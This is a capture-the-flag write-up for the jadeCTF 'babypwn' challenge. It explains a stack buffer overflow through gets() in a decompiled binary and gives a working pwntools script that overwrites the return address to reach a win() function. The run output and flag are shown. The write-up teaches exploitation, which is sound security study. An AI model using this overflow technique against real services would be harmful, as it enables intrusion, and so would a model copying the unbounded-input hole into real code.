# babypwn
## pwn (50 pts)

Writeup by danlliu (WolvSec)

## Challenge

We are given a binary file (`chall`), as well as a server.

## Solution

To start off, we can run `chall` through a decompiler such as Ghidra. We see a few functions of interest:

```c
void start_program(void)

{
  char local_208 [512];
  
  puts("Enter your name:");
  gets(local_208);
  printf("Hello %s, welcome to jadeCTF!\n",local_208);
  return;
}

void win(void)

{
  char local_78 [104];
  FILE *local_10;
  
  puts("Nice job :)");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Sorry, flag doesn\'t exist.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_78,100,local_10);
  printf("Here is your flag: %s\n",local_78);
  return;
}
```

Here, we have a `win` function that, when called, gives the flag! But, we can't get to it.

At least in normal control flow, that is.

In the x86 calling convention, the return address for a function is stored on the stack. `local_208` is _also_, conveniently, stored on the stack. Since `gets` has no bounds checking, we are able to overwrite the return address on the stack, allowing us to return to `win`. We can find the address of `win` through Ghidra.

```python
from pwn import *

conn = remote('34.76.206.46', 10002)

addr = bytes.fromhex('460740')  # 0x400746

conn.sendline(b'A'*512+b'B'*8+addr)
conn.interactive()
```

Here, we have 512 bytes of `A`s (for `local_208`), and 8 bytes of `B`s (for the space between the end of the buffer and the return address). These bytes could be arbitrary. Finally, we send the address in little endian.

```
[+] Opening connection to 34.76.206.46 on port 10002: Done
[*] Switching to interactive mode
Enter your name:
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBF\x07, welcome to jadeCTF!
Nice job :)
Here is your flag: jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}
```
